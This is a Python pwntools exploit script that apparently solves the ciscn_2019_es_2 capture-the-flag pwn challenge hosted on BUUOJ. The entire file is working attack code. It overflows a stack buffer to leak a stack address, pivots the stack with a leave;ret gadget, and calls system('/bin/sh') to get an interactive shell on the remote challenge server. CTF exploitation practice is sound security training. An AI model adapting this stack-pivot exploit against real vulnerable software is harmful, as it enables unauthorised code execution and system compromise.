from pwn import *


def ciscn_2019_es_2(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_es_2'):
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node5.buuoj.cn', 25861)
    target_elf = ELF(file_name)

    system_plt = p32(target_elf.plt['system'])
    leave_ret_gadget = p32(0x080485FD)  # leave ; ret

    target.sendline(b'A' * 31 + b'B')
    target.recvuntil('B')
    stack_addr = u32(target.recv()[8:12]) - 0x3C
    bin_sh_addr = p32(stack_addr + 0x10)

    # system_plt()
    payload = system_plt + p32(0xdeadbeef) + bin_sh_addr
    # /bin/sh
    payload += b'/bin/sh'
    payload = payload.ljust(40, b'\x00')
    payload += p32(stack_addr) + leave_ret_gadget

    # gdb.attach(target)
    target.sendline(payload)
    target.interactive()


if __name__ == '__main__':
    ciscn_2019_es_2()
